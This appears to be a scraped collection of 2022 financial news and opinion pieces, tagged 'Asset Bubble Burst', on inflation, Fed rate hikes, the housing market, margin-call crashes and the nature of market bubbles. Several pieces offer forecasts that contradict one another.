And right now, the input costs have been far outpacing the ability of [corporations] to pass them on.

What are the implications?

I’m looking at the difference between the two and seeing an implied margin squeeze for the average corporation. We’ve never seen a squeeze this huge other than in the 1970s.

I’m talking about real pressure on corporate profit margins.

Will there be indications of a profits recession on current earnings reports?

Just because input costs are going up faster than corporations’ ability to pass [them] along, doesn’t mean this immediately hits current earnings reports. It takes a while for it to show up in the actual earnings numbers.

So it will take time for the commentary from companies to filter into Wall Steet strategists’ forecasts.

Why is no one else forecasting a profits recession, as you say?

No one is looking ahead. They just take whatever the companies say as gospel until they say otherwise.

Wall Street focuses only on what the companies say. They wait for them to say [for example], “Here’s our guidance for the next quarter.”

What’s the primary risk that you perceive?

The Fed is going to belatedly ransack inflation. This is the main thing that has the stock market anxious.

You’ll see the stock market continue to come under pressure if the Fed continues to move rates up.

Most people are saying, “They’ll raise rates, and the economy will have this, sort of, soft landing. It will slow, and everything will be perfect.”

I think that expectation is just fantastical, to put it nicely.

Can the Fed trigger a recession by raising interest rates?

It remains to be seen whether we’re in a recession right now or not. In the first quarter [real GDP growth fell at a rate of 1.4%].

If we do that again in the second quarter, even by the barest margins, technically we will have accomplished the definition of a recession.

The Fed got religion about inflation right when it was about to take care of itself anyway because consumers already ran out of the money with which to sustain their spending on everything at higher prices.

It’s kind of a classic Fed blunder.

What’s the economy’s state of health?

The idea that the Fed can raise rates without precipitating a recession is rooted in a misapprehension about how strong the economy really was to begin with.

When you take out the amount of money that was handed to consumers to spend, a different picture [emerges] about the inherent strength of the economy and the ability to withstand the stimulus withdrawal.

But the consensus has been that the economy is strong. How do you reconcile that with what you’re saying?

One of the things the Fed and Wall Street have underestimated is the degree to which the strength of the economy that we saw in the last couple of years was entirely a function of the monetary and fiscal stimulus, which totaled roughly $10 trillion.

We put $10 trillion into the economy, but GDP grew only $2.3 trillion. With inflation, you come up with $600 billion real growth.

It’s sad how little actual increase in economic activity we got for all that stimulus.

What we did get was a massive bubble in financial assets, which is now starting to deflate because we’re taking the stimulus away.

You write that the asset bubble is now deflating and “we can expect spending to slow materially, squeezing margins and depressing hiring.” Please elaborate on consumer spending.

For so long, real wealth and “phantom wealth” have been the tail wagging the dog of the economy. When there’s a positive wealth effect, consumers ramp up spending and have a higher tolerance for accepting higher prices.

[Just so], when the reverse happens and their net worth starts to decline, they pull back on spending and on their willingness to abide higher prices across the board.

And this is happening now?

We’re getting into that situation now, in part, because policy suggests that energy prices, for sure, and food prices, maybe to a lesser extent, are going to remain elevated.

So even as people start seeing their 401(k)s going in the wrong direction and have the impulse to cut back their spending, they’re still going to be paying more and more for everything they can’t live without.",Asset Bubble Burst,2022-05-23 07:00:00

Another reason why housing prices may not crash this time around is the Americans’ household indebtedness.","Lately, with large companies announcing retrenchments and interest rates starting to rise, some concerns that the current surge in housing prices could potentially end up like 2008 are making their rounds.

While these concerns are understandable, there are distinct differences between this downturn and the 2008 recession. Three main differences between then and now explain why these worries are unfounded.

1. Stock Valuation Aren't That Far-Fetched

When it comes to the stock market, the similarities between 2008 and today are obvious. Both eras saw a rapid appreciation in equity prices, leading valuations to rise to near-historic levels. Some experts even think we are experiencing an “everything bubble,” where asset prices are way over-valued.

One of the most prized measures of the stock market’s relative value is Yale economist and Nobel laureate Robert Shiller’s cyclically adjusted price-to-earnings (CAPE) ratio. Currently, the ratio stands at 36.67, while before 2008, it was measured between 25 and 27. The CAPE ratio has only ever been higher than today during the dot-com era in late 1999 and 2000.

However, CAPE is just one old method of stock valuation. There are many other ways to measure valuation and many financial market experts of today say the stock market is valued differently than it used to be. Many tech analysts vouch that the current growth trajectory is dramatically different today than in 2007 before the financial crisis.

Tech valuations relative to growth, for example, are cheaper by about 25% than in 2007. This means that the naysayers only use metrics that support their overvaluation argument and do not look at the full picture. Stock valuation is not that stretched by today’s standard.

2. Housing Market Situation Is A Lot Better

The 2007-2009 financial crisis began with cheap credit and lax lending standards that fuelled a housing bubble. It began during a period of ultra-low interest rates and took several years to unfold. The only similar parts then and now lie with the low-interest rate only. The other parts of the equation are markedly different.

The subprime mortgage crisis preceded the stock market crash of 2008—a black swan event considered so rare as to be effectively impossible to predict. While the bulk of the damage was from the Bear Sterns-Lehman fallout, the crisis was initiated by the subprime mortgage crisis that affected Wall Street banks as subprime loans with poor borrower credit history were repackaged as low-risk financial instruments such as mortgage-backed securities (MBS) and collateralized debt obligations (CDOs) and sold to them.

Soon a big secondary market for originating and distributing subprime loans developed, and the availability of high leverage made trading in such toxic assets spiral out of control. Everyone bet that the housing market would go up forever.

When the bubble burst, financial institutions were left holding trillions of dollars worth of near-worthless investments in subprime mortgages. At the same time, millions of American homeowners found themselves owing more on their mortgages than their homes were worth, making it a double whammy for the banks since even repossessing that real estate could not help the banks recover the bad debts.

The losses on real estate lenders and brokers spread throughout the financial industry and eventually brought about several bank bankruptcies, including the biggest failure in US history, Lehman Brothers. However, the current housing market in the USA is very different from that in 2007.

According to US Census Bureau data, while US homebuilders produced 27.1 million homes between 2000 to 2010, that figure fell sharply to only 5.8 million between 2011 and 2021. This lack of production has led to a severe supply crunch in today’s housing market.

This means that the current surge in home prices may be more sustainable than it was back then, and a collapse is less likely, even if interest rates were to rise another few upticks. In 2008, the housing market was in oversupply.

Another reason why housing prices may not crash this time around is the Americans’ household indebtedness. This level is still some distance away from the unsustainable level reached in 2007, where according to Federal Reserve data, the debt of American households in 2007 was around 100% of GDP. That figure stands at only around 77% of GDP in 2021.

Household debt to GDP, US.

Hence, while I agree that the housing market will undergo a correction, it may not end up like the crash in 2007, which led to the insolvency of several mortgage brokers and eventually even took down Lehman.

3. Banking Sector Reforms

The key reason why this downturn may not end like 2008 is banking sector reform. After the 2008 crash, various regulations were put in place by the US Treasury to prevent such an event from happening again. One major reform was the passage of the Dodd-Frank Wall Street Reform and Consumer Protection Act in 2010.

The act restricted, to a large extent, the risky activities of banks and allowed increased government oversight of banking activities. The introduction of the Basel III requirement also forced banks on a global level to maintain larger cash reserves and reduce leverage. Basel III was implemented in 2009 and is still in effect today. Hence, the irrational credit over-extension in the 2000s that led to the eventual fallout in the financial industry has no chance of happening in the current context.

Basel III has three main components to reduce banking sector risk – Capital Requirement, Leverage Ratio, and Liquidity Requirements. The Basel III accord raised the minimum capital requirements for banks from 2% in Basel II to 4.5% of common equity as a percentage of the bank’s risk-weighted assets. There is also an additional 2.5% buffer capital requirement that brings the total minimum requirement to 7%.

As for leverage, the Federal Reserve Bank of the United States fixed the leverage ratio at 5% for insured bank holding companies and 6% for Systematically Important Financial Institutions (SIFI). Basel III introduced using two liquidity ratios – the Liquidity Coverage Ratio and the Net Stable Funding Ratio. The Liquidity Coverage Ratio requires banks to hold sufficient highly liquid assets that can withstand a 30-day stressed funding scenario as specified by the supervisors. The Liquidity Coverage Ratio (LCR) currently is 70% of the required liquid assets.

On top of the LCR, there is also the Net Stable Funding Ratio (NSFR), which requires banks to maintain stable funding above the required amount of stable funding for one year of extended stress. Hence, one can see that there are a variety of controls in place to prevent banks from incurring the kind of losses they made in 2008. When banks are safe, large contagion trickling down and paralyzing the economy is prevented.

Of course, that is not to say that we will not see a painful fall in asset prices and an inevitable recession should the job market and economy deteriorates. What I am trying to say is that the catastrophic level type of fallout that was 2008 is not likely to happen again this time around.

The economy could be hurt should the lockdowns be back again, and consumers could be the worst hit this time with still rising. However, a systematic failure of the financial industry is not likely to repeat. The surge in counterparty risks that highlighted the 2008 crisis cannot happen again due to the strict regulations and high capital requirements that banks need to comply with.

Conclusion

Comparing the situation now with that of 2008 consoles, even myself. Even when all the measures are in place to avoid another hard landing of the economy, the Fed will be quick to revert to easing once any signs of a large dip in housing prices or the stock market are seen.

The Fed has much more room to maneuver now since they can do quantitative easing (QE). When things deteriorated to that extent in 2008, such innovative methods of pumping liquidity into the financial markets were not yet invented.

Also, bulls should not wait to pounce. Once the Fed shows signs of deliberation about whether to continue tightening would be the time the markets could start to stage a spectacular recovery.",Asset Bubble Burst,2022-06-13 12:36:00

Those jostled by the news that the housing market could crash have every reason to be worried. And why is that so? Because the last time the housing market soared like this—it sparked a great recession that left many in financial ruins.

The Real Estate Market Crash is Coming Sooner Than You Think

Typically, a rapid increase in home prices, a rising housing demand, and home flippers precede a real estate crash.

Until recently, real estate was experiencing record low-interest rates, making housing affordable. However, that has caused skyrocketing house prices. It is crystal clear that demand is outpacing supply. What’s next? Could mobile and modular homes be the fix?

The sale of mobile homes might just be a potential fix to the American housing shortage, because they take a shorter time to build than site-built homes.

Google reported that “When is the housing market going to crash?” has been a hot topic since March 2021. Many are anticipating that history will repeat itself, with a repeat of the 2008 housing market crash.

Speculation is rampant about how and when the real estate market could crash—but first, what can we learn from the 2008 housing market crash? Here are some interesting facts about the events preceding that crash.

In 2022, despite higher mortgage rates, the real estate market is still hot. (Monkey Business Images/Shutterstock)

Causes of the Housing Market Crash in 2008

The housing market crash 14 years ago ignited a worldwide recession. The sole reasons for the crash and financial crisis boiled down to predatory private mortgage lending and unregulated markets. Here’s what preceded the great recession of 2008:

Housing Prices and Foreclosures

Prior to the market crash in 2008, housing prices shot through the roof, with speculative buyers flooding the market, leading to demand exceeding supply.

In the early-to-mid 2000s, mortgage lenders revised their lending standards, which opened a window to borrowers with poor credit, allowing them to get access to loans and secure home purchases. The easing of lending standards created an opening for many to access mortgages.

The Rise of Mortgage-Backed Securities (MBS) Was Hugely Misunderstood by Many Investors

The high demand in the housing market propelled an increase in risky mortgage lending practices. At the same time, the Federal Reserve Bank raised the interest rate to 5.6 percent by June 2006.

What about Adjustable Rate Mortgages?

While many of those with conventional loans weren’t affected, those with adjustable rate mortgages (ARMs) were the casualties. Plunged into unforeseeable debt, many defaulted, leading to a huge rise in foreclosures in the housing market.

In 2008, the number of foreclosures spiked to a record high of 81 percent, according to a CNN report. A total of 861,664 families lost their homes to foreclosure that year. This led to more inventory availability, and a subsequent crash.

Banks’ Risky Behavior

The rise of Mortgage-Backed Securities (MBS) led to financial institutions extending their mortgage lending. Many banks seized the opportunity for a lucrative long-term benefit. All was well until the bubble burst, leaving a huge collateral of subprime mortgages.

On the other hand, banks stopped lending to each other in fear of being trapped with subprime mortgages. Even after the Federal Reserve cut interest rates, it wasn’t enough to stop the bleeding economy (the panic).

The Stock Market Crash

The stock market crash led to many losing their wealth. This was caused by the increasing number of closures and housing busts. In fact, the major financial markets lost more than 30 percent of their value by September 2008, when the Dow Jones Industrial Average fell 777.68 points, which exceeded its 684.81 loss on Sept. 17, 2001, the first trading after the September 11 attack.

According to a report by NCBI, between 2007 and 2011, one fourth of American families lost at least 75 percent of their wealth, and more than half of all families lost at least 25 percent of their wealth.

Are You Following Current Events?

Now, back to the present, can you see the similarities? It is clear that housing markets are in a bubble. In this article, we’ll reveal why we think the real estate market crash is coming soon.

Real Estate Market Crash Coming Soon

Analysts have made their point: the federal government has had its say, different perspectives have been put forward in a bid to break down the events of the current housing market.

Statistics and History

Statistics and history agree. The only question remains, will the housing market crash this year?

Whether you love statistics or not, we’ll try to help you see why the market could crash sooner rather than later. A market crash doesn’t happen in a split second; it builds over time.

Watch Economic Factors

Economic factors at play, the forces of demand and supply, drive a free market like real estate. Frank Nothaft, a chief economist at CoreLogic, said a year ago, “We’ve got an acute shortage of supply on the market for sale at the same time that record-low mortgage rates are driving the appetite to buy by millennials and Gen-Xers.”

New York City Prices Among Others

For instance, Bloomberg reported New York City home prices are rising fast. New Yorkers who may still be working from home a year into the pandemic are fanning out across the boroughs in search of housing that is spacious and cheaper.

Whenever one side outplays the other, a disequilibrium is created, an imbalance in the market. For example, basic economics dictates that interest rates and housing prices have an inverse relationship. As such, when interest rates are low, house prices go up. Why is that?

It’s simple: when the rate is low, housing becomes cheaper or affordable to acquire; this, in turn, creates a high demand for housing since it’s affordable at the time.

The Investors

Investors or homeowners, on the other hand, will try to take advantage of the rising demand by increasing prices. As prices rise it will cut off some people who will suddenly be unable to purchase homes. Now, demand is brought down by price growth, thus justifying the inverse relationship with the interest rates.

The Housing Bubbles Burst

You’ve heard the term housing bubble. Do you know what it means? What causes it? And if it burst, what factors are the last straw that breaks the camel’s back?

Day by Day, It’s Harder to Deny the Fact the US Housing Market Is Overheating

Across the country, the housing market was 3.8 million single-family homes short of what was needed to meet the country’s demand, according to an analysis by mortgage-finance company Freddie Mac in May 2021.

Home Price Surge also Suggests an Asset Bubble

COVID-19 hasn’t slowed home prices at all. Instead, they’ve skyrocketed. In September 2020, they were a record $226,800, according to the Case-Shiller Home Price Index.

According to the National Association of Realtors, the sales rate reached 5.86 million homes in July 2020, and by October 2020, it had blossomed to 6.86 million, beating its pre-pandemic peak. Many people were taking advantage of the low rates to buy either residential homes or income-based apartments, which seem affordable.

COVID-19, on the Other Hand, Has Created a Slow Economic Activity Resulting in a High Unemployment Rate

According to the Labor Department, the U.S. lost 140,000 jobs in December 2020 alone. A rising number of job losses means few people will afford to buy houses, while those with mortgages will likely default and increase the number of foreclosures.

On the other hand, job losses have forced many people to seek Plan B, going for mobile homes that are exceptionally affordable during this time.

What Is a Housing Bubble?

A housing bubble happens when the market price of residential real estate sharply rises. Usually, this happens when the demand for houses exceeds the supply in the market. The rising demand triggers speculators to enter the market to profit from future expectations.

The Presence of Speculators in the Market Further Pushes the Demand Higher

So, yes, speculators entered the market, and in response, home prices shot up, stretching the housing market bubble even further. Now it reaches a time when the home prices are no longer affordable to buyers. The unsustainability caused by the rising prices leads to homes being overvalued. In other words, price inflation.

When the Prices Become Unsustainable and Buyers Pull Out, Demand Falls

Prices are unsustainable—but interestingly, the supply increases. Simple economics at play here. Now that the demand has fallen, what happens next? Prices come crashing and the bubble bursts.

When questioned about the possibility of a bubble, Ali Wolf, chief economist at housing research firm Zonda, said in 2021, “Homebuyers today are purchasing for many healthy reasons: Low-interest rates, more flexibility to work from home and increased saving are all rational reasons for buying a house. The frenzy fueled by these factors, combined with fear of missing out, has the potential to create a bubble though.”

What Causes a Housing Bubble?

Real estate is a free market: the law of demand and supply applies unconditionally. When the demand for housing increases, subsequently, home prices go up. Usually, the supply of homes takes time to match the rising population of young Millennials who are seeking first-time homes. It always plays a catch-up game.

Building a house takes time, causing a deficit in supply and thus demand exceeding it. Either way, prices will eventually increase the moment demand outpaces supply. To sum it up, the asset bubble is down to a combination of factors. One such factor is a healthy economy, where disposable income grows, and people feel secure in their jobs and confident about searching for a house, increasing the demand.

The Mortgage Rates Also Play a Huge Role in the Asset Bubble

Low mortgage rates drive up demand. Why? Mortgages become more affordable and buying a house is a lot easier, causing many borrowers to run for cheap loans.

The rising number of subprime borrowers also causes the demand to further rise in the real market. The market had experienced record low mortgage rates in 2021, driving housing demand up.

The other factor is the speculators who are always in waiting mode to take advantage of an opportunity whenever it presents itself. Further rise in demand leads to overvaluation of houses which asserts the asset bubble growth.

Forces that Burst the Bubble

When push comes to shove, and prices aren’t reflective of anything close to fundamentals, the bubble bursts. At this point, the demand decreases while supply increases resulting in a sharp fall in home prices.

Home prices fall; on the other hand, investors are at a huge loss, mortgage lenders reeling on the risk of defaulters. How does that happen?

Firstly, interest rises, putting homeownership out of reach for some, while at the same time, in adjustable-rate mortgages lead to defaulting and foreclosure for homeowners.

Secondly, a downturn or slow economic activity often leads to less disposable income, fewer jobs, and job loss. Such a situation causes a decline in demand for housing since people can not afford to buy homes.

Lastly, when demand is exhausted, an equilibrium is restored, slowing down the rapid rise of home prices. When house prices stagnate, those who depend on them to afford their homes may lose their houses, bringing more supply to the market.

Higher Interest Rates

As stated earlier, interest rate and house prices tend to have an inverse relationship such that when the interest is low, price appreciation occurs, and the reverse is also true. Interest rates play a huge role in market crashing. And if it’s going to happen soon, this will surely be a contributing factor.

Rates Rise, Making Mortgages Very Expensive

Rising interest rates discourage borrowers from taking loans. On the other hand, home buildings will be affected too, costs will rise, and an immediate effect will be the supply of housing in the market falling.d

However, a steady rise in interest rates will not cause much damage in the housing market, unlike a rapid rise. In 2006 before the housing market crash, many people were tied to interest-only and adjustable-rate mortgages that are initially cheap within the first few years, and then a reset that increases the monthly mortgage payment.

Unlike Conventional Loans, Adjustable-Rate Mortgages Rise Along With the Feds Fund Rate

Between 2004 and 2006, the Federal Reserve increased the rates rapidly. For instance, the top rate was 1.0 percent in June 2004 and doubled to 2.25 percent by December. It doubled again to 4.25 percent by December 2005. Six months later, the rate was 5.25 percent.

Rising Number of House Flippers

A flipped home is basically bought, renovated, and sold in less than a year. Usually, the rise of home flippers further increases the demand for housing in the real estate market, resulting in a further increase in house prices. Surging prices are reflective of an asset bubble that could potentially burst.

Home Flipping Played a Huge Role in the 2008 Recession

Speculators would buy homes, make moderate improvements, and sell them. In 2006, flips comprised 11.4% of home sales.

According to Attom Data Solutions, in the third quarter of 2020, 5.1 percent of all home sales were bought for quick resale. That’s down from 6.7 percent of home sales in the second quarter of 2020. It’s also lower than the post-recession high of 7.2 percent in first-quarter 2019.

The decline in flipping is due to the reduced inventory of housing stock. However, Attom Data Solutions reports that the pandemic’s effect on flipping is contradictory and difficult to forecast.

The Alarming Increase in Unregulated Mortgage Brokers

In the events leading to the 2008 financial crisis, mortgage lenders fueled the asset bubble by issuing loans to high-risk borrowers. Many of the lenders opted to borrow against lines of credit, a totally different strategy than how banks and mortgage lending normally work by tapping into deposits.

Non-Bank Lenders Are a Warning Sign of a Crash

The increase in non-bank lenders is alarming and a clear warning sign of what may come sooner rather than later in real estate. In 2019, they originated 54.5 percent of all loans. That’s up from 53.6 percent in 2018. Six of the 10 largest mortgage lenders are not banks. Three years ago, five of the top 10 were unregulated.

The most worrying part about unregulated mortgage brokers is that they don’t have the same government oversight as banks. Making them vulnerable to collapse in case of anything going south in real estate.

A section of the Washington Post read: “Although observers say non-bank lenders are probably not engaged in the sort of risky lending that dragged down their predecessors, the business model still makes them vulnerable to a housing market downturn.”

Inverted Yield Curve

Prior to the recession of 2008, 2000, 1991, and 1981, the yield curve inverted. According to a definition by Investopedia, an inverted yield curve represents a situation in which long-term debt instruments have lower yields than short-term debt instruments of the same credit quality. When the yield curve inverts, short-term interest rates become higher than long-term rates.

The Inverted Yield Curve Is Considered to Be a Predictor of Economic Recession

Usually, they draw attention from all parts of the financial world. A normal yield curve slopes upwards reflecting the fact that short-term interest rate is usually lower than long-term rates.

Affordable Housing Crisis

The affordable housing crisis is caused by the imbalance in the market forces of supply and demand. A market boom in real estate will result in home prices skyrocketing. The scarcity of affordable housing across the country is always a sign that the market is in a bubble.

The Bottom Line

Is the Market Going to Crash

The market could crash if the combination of the above factors comes to pass. Already many are in play, and as the home prices sores, it’s evident that the U.S. housing market is overheating.

The Pandemic Has Had a Mixed Reaction on the Real Estate Performance

While many people expected COVID-19 to crash real estate, there was a sudden surge in homes for sale. More homes for sale listings were done last year, with people rushing to buy homes in the suburbs. The rising homes for sale listings sparked speculators to enter the market, further pushing the demand up.

Move to Prevent Foreclosures

Elsewhere, millions fell behind on their mortgage payments. However, the Consumer Financial Protection Bureau (CFPB) made mortgage servicing changes to prevent a wave of COVID-19 foreclosures.

Consumer Financial Protection Bureau (CFPB) Acting Director Dave Uejio says, “The nation has endured more than a year of a deadly pandemic and a punishing economic crisis. We must not lose sight of the dangers so many consumers still face.”

Goya’s man is dreaming, and Hamlet is consciously considering suicide.

I say policymakers the world over have put their reason to sleep but remain awake to do great harm. The harm is better said to be murder of national interest rather than suicide, since some leaders remain present and continue their folly.

Policy in the US and only slightly less so in China allows inflationary increases in the money supply and spendable paper claims to occur, combined with a conscious effort to suppress production via lockdowns. The result is the essence of inflation/recession: added buying power and empty shelves.

In a sense it is already recession or depression, since so many citizens are dissatisfied, even depressed, at their personal economic and social state of affairs.

Everyone using social media has seen and heard the frustrated citizens of Shanghai at night, baying at the moon. In Anytown USA, citizens can be seen cursing the price shown on their gasoline pumps and cursing the politicians as well who are thought to be responsible.

Everywhere there is a sharp reduction in the satisfaction that citizen consumers get from there economic lives, and everywhere there is a deep drop in the profits citizens earn in their productive, working lives. Even when people are “making money” because of real-estate bubbles or stock-market gyrations, citizens understand that such speculative riches may disappear as quickly as they pop up.

The politicians who put their reason to sleep while they were spreading false good times with checks in the mail and business bailouts have good reason to fear lost public support and/or election setbacks. Those worries now cause double-down-style policy actions, in anticipation of classical recession hints in the statistical wind.

OK, there is a lot of economic dissatisfaction around. And it is connected with inflation. But what is the process by which inflation turns into obvious, standard, everyday recession (or worse)?

Price ratios

During inflation, prices for different products increase at different rates, and therefore the ratios between prices change. Some ratios are critical. For example, the price of gasoline may double, while the price of steak at the supermarket might go up by 50% and the wage of the household may increase by only 5%. The householder finds that traditional buying habits must be changed, reducing the overall level of buyer’s economic satisfaction.

In an economy like China’s, with significant elements of central planning and control, many critical prices and price ratios are set externally, in uncontrollable international markets. Producer input prices faced by Chinese planners and firms are now rising at 9-10% a year, making a mess of old plans and forcing firms to make uncomfortable changes to the prices they do control, especially wages and prices paid for locally produced inputs.

(Money wages may not be cut, but the fall in buying power caused by inflation does the job.)

In the absence of such adjustments, the prices that China must charge for the goods it exports must rise, causing lost sales, endangering the inward flow of international money and putting at risk the national growth factor produced by such export earnings.

Likewise, costs of production all over the US economy have risen, and cost ratios have changed, reducing profits and dislocating productive efforts (sometimes because of misguided regulatory shutdowns like the one that caused an artificial shortage of baby formula nationwide).

Bubbles and crashes

One classic process whereby bubble inflation in the stock market leads to recessions is the margin-call crash. Stock-market brokers, who actually hold the stocks “owned” by customers who bought the stock with money borrowed (on “margin”) from the broker, where the stock has been put up as collateral against the debt, will sell the stock and so cash in the collateral during panic times.

This process can occur in any market, any place, China or America. It consists in the forced sale of assets, once bubbling up in value, now falling in price, that were bought in the first place with borrowed money; especially when the lender was a middleman in the deal, and the underlying asset was put up as security for the loan: That security is now gone as far as the lender is concerned, since even if the lender takes over the asset when the borrower cannot pay, the asset’s value is now insufficient to pay of the debt.

The lender, himself strapped for cash, sells the asset, even at a price below “real value,” since nobody knows when the bubble burst value declines seen everywhere will stop. It is the downside panic that too often characterizes the end of a bubble.

An example will help. Investor buys asset at 100 yuan. (Let us say the asset is made of 100 parts, each part initially worth one yuan.) To pay, he puts up 10 yuan and he borrows 90 yuan from his friend. Friend says, “OK, but if you do not pay me when I ask for my money, and I will ask for my money if the asset is not worth at least 90 yuan, I will seize the asset, or some other asset of yours that is worth at least 90 yuan, so I am sure of getting my money back.”

Investor does not worry in an up-bubble, since he reasonably predicts the asset will soon be worth 200 yuan, and he may always sell a part of the asset to settle the debt of 90, and have full equity in a new position. (Since each of the 100 parts of the asset is now worth 2 yuan, investor need sell only 45 parts of asset to get enough money to settle the 90 yuan debt, keeping 55 parts for himself.) Remaining investment is debt-free, worth 110 yuan.

The price ratio that gets out of line in a down-bubble that is especially ruinous and dangerous is the ratio between good investments and bad ones. All investments look bad and all get sold out.

During a down-bubble, the aggregate value of the 100-part asset falls below 90 yuan, the friend cannot get all his money back when he seizes the asset and sells it; although he will do so, and then come back to the investor and demand more money. The investor has been sold out of the original asset and must find other assets to sell to close out the original debt.

Investor may be forced to panic-sell really good assets at give-away prices, just to settle the debt against the bubble asset. This is the process whereby a down-bubble creates universal selling of all kinds of assets, destroying all kinds of value, leading in the worst case, to market collapse and even general depression.

Some changes and price ratios are internal to firms. The operator of a family-owned restaurant discovers that the input prices rise faster than he can pass along to customers and remain competitive.

Say the price the family must pay for incoming ground beef goes up by 15% but the family can only increase the price of hamburgers that they push across the counter by 5% if they are to retain their customer base. That means either profits nosedive or they squeeze other costs: Perhaps they let some of the hired staff go. Such unemployment is another element of recession caused by changed price ratios.

Policy failures

Policymakers see these troubles cascading through the economy: Investors are selling out good assets while lenders are not getting their money back. Small businesses are failing. Ordinary workers are losing their jobs. None of this is ”deserved.” Good investments are dumped for pennies. Dependable workers cannot find jobs. Restaurants that serve excellent hamburgers go out of business.

Policymakers are at a loss. They make matters worse with business bailouts that do not distinguish between good hamburger sellers and bad ones. Unemployment checks go to shirkers as well as hard workers. Bubble asset prices are supported, and worthy assets cannot find buyers.

Everywhere policy mistakes are obvious and give rise to voter/citizen unrest because of perceived unfairness. If and when policy gets things right, there is an overall impression of hit and miss. Policymakers are seen to be right only by chance and so get no credit at all. A general sense of failure and ineptitude prevails, in both private markets and political discussions.

Neither the Chinese way of doing things nor the Western tradition has a good record correcting the many imbalances that comprise an economic order beset by the entwined processes of inflation and recession.

When a “cure” has occurred, there is a return to normal price and value ratios. Then, young couples working at their first jobs can make enough money and have enough employment security to buy their first house or condo without having to ask their parents to pay the unbalanced price demanded in a bubble real-estate market. Small businesses once again pay for needed inputs while charging enough to earn profits required for long run survival.

But how to quickly or easily bring about this normal state of affairs by political means, by planning or by indirect policymaking, is not known. Historically, it certainly has not been done in the short run.

Historically, about all that can be said is that policymakers must reawaken their sleeping reason and stop making things worse. Otherwise, their nightmare dreams will continue to stalk us all.

A market bubble is a rapid rise in the price of stocks or other assets that is not justified by fundamentals and is followed by a sharp fall in prices once investor enthusiasm wanes.

Bubbles are driven in large part by investor sentiment and psychology, which generate a positive feedback loop of rising prices and additional buying. As a stock or other asset's price rises, more and more investors see the rising prices as an opportunity to profit. Further buying pushes prices even higher, which attracts more investors as the bubble inflates. Eventually, the bubble bursts when enough investors realize the price of the asset has become detached from its true value and begin to sell all at once .

How Do Bubbles Work?

A major part of the formation of market bubbles involves assets becoming significantly overpriced relative to their true value. As Nobel Prize-winning economist Robert Shiller wrote in his book ""Irrational Exuberance,"" many investors who have doubts about the underlying value of an asset are also sucked into a market bubble.

""I define a speculative bubble as a situation in which news of price increases spurs investor enthusiasm, which spreads by psychological contagion from person to person, in the process amplifying stories that might justify the price increases and bringing in a larger and larger class of investors, who, despite doubts about the real value of an investment, are drawn to it partly through envy of others’ successes and partly through a gambler's excitement,"" Shiller writes.

Part of this seemingly irrational behavior is a phenomenon known as the ""greater fool theory."" According to the greater fool theory, investors often buy assets at prices that they know are unjustifiably high simply on the hope that they will eventually have an opportunity to sell the assets at even higher prices to a buyer behaving even more foolishly than they are.



Bubble vs. Bull Market

Just because the price of the S&P 500 or another asset has appreciated significantly doesn't necessarily mean the market is in a bubble. The S&P 500 has averaged an annual gain of a little more than 10% since 1926 and has more than tripled in the past decade. However, much of the S&P 500's price appreciation in recent decades has been driven by underlying long-term earnings growth of its component companies. A bull market is an extended period of time in which asset prices rise. Bubbles occur when those assets rise sharply without underlying fundamental justification, such as earnings growth, to justify those price gains.

Recognizing a market bubble in real time and predicting its bursting is very difficult, but there are certain red flags for investors to monitor. Bubbles are typically marked by a prevalent story, such as the idea that a new technology or new way of thinking has permanently transformed the market.

During the height of market bubbles, prices often continue to rise even following bad news, such as earnings misses or analyst downgrades. Finally, bubbles are often marked by large groups of novice or amateur investors who believe experienced investors are behind the curve or simply just don't ""get"" the new market paradigm driving prices higher.

5 Stages of a Market Bubble

American economist Hyman Minsky outlined the five stages of a market bubble in his 1986 book ""Stabilizing an Unstable Economy"":

Displacement. Boom. Euphoria. Profit taking. Panic.

The first of Minsky's stages is ""displacement,"" a change or series of changes that alter the way investors think about the market. The second stage is ""boom,"" during which asset price appreciation accelerates, attracting speculative investors. In the third stage, ""euphoria,"" frenzied buying is driven more by investor greed and excitement than by fundamental analysis. Once asset prices rise high enough, investors begin cashing out with huge gains during the ""profit taking"" stage of the bubble. Finally, investors fearfully sell their assets at any price to avoid further losses during the final stage of a bursting bubble – the ""panic"" stage.



Fear of Missing Out (FOMO)

During the euphoria stage of a market bubble, one of the psychological phenomena that drives accelerated buying is fear of missing out, or FOMO. FOMO occurs when investors who might otherwise be uninterested in a particular stock or asset feel compelled to invest because they see how much easy money others are making in the market. Near the peak of a financial market bubble, it can feel to an outsider as if virtually every investor is getting rich and everyone on the sidelines is missing out on the opportunity of a lifetime. In reality, this stage of the bubble is often the worst time to buy.

Why You Need to Know About Market Bubbles

Depending on your specific investment strategy, market bubbles can be excellent opportunities, disastrous pitfalls or anything in between. By recognizing the warning signs of a market bubble and understanding the stages of a bubble, investors can ensure that they are not falling prey to the psychological biases that often lead people to make the worst investment decisions at the worst times. For many diversified investors, the best approach may be to simply ignore booms and busts in the stock market and focus on staying disciplined with a long-term investing plan .

Pros of Market Bubbles

Investors can make plenty of money in the market during the early stages of a market bubble. In addition, high-quality companies can take advantage of inflated stock prices to issue equity offerings, selling shares of stock to raise money they need to invest in future growth or pay down debt. Market bubbles also typically attract new groups of investors to the market for the first time, and the ones who are not discouraged by the short-term bubble volatility may end up being better off financially in the long term because they started investing.

Cons of Market Bubbles

Unfortunately, many investors end up losing a lot of money during market bubbles because they don't start buying until asset prices are already significantly overvalued. Bursting market bubbles can also threaten the stability of the financial system or the economy as a whole, as investors witnessed during the bursting of the mortgage bubble in 2008 and 2009. Finally, the extreme pricing volatility associated with bubbles can make investors disillusioned with the market in general, especially when it seems that asset prices have virtually no connection to real-world value.

Famous Market Bubbles

""Tulip mania"" is one of the earliest examples of market bubbles, dating to the 1630s in Holland. During the peak of the tulip bulb market bubble, the prices of some of the most prized tulip bulbs were roughly in line with the price of a nice house in Holland at the time. During the dot-com bubble in the late 1990s, investors piled into any stock of just about any company with a website, regardless of its share price, revenue or profit outlook. When the dot-com bubble burst in 2000, the Nasdaq Composite Index dropped nearly 80% over the next two years. The bursting of a bubble in the U.S. housing market in the mid-2000s ultimately triggered the subprime mortgage crisis of 2007 through 2010, during which banks overexposed to the mortgage derivatives market eventually had to be bailed out by the U.S. government to preserve the integrity of the global financial system.

Top CEOs and investors have struck an optimistic tone on the recent sell-off global technology stocks, telling CNBC it's unlikely to metastasize into a broader market crisis. The tech-heavy Nasdaq 100 index closed Monday's trading down more than 26% year-to-date and earlier this month — after the Federal Reserve raised interest rates — the world's largest technology companies shed over $1 trillion in value in just three trading sessions. Tech and growth stocks have been hit hard by the prospect of higher rates, as the Fed and other major central banks around the world look to rein in soaring inflation by tightening monetary policy.

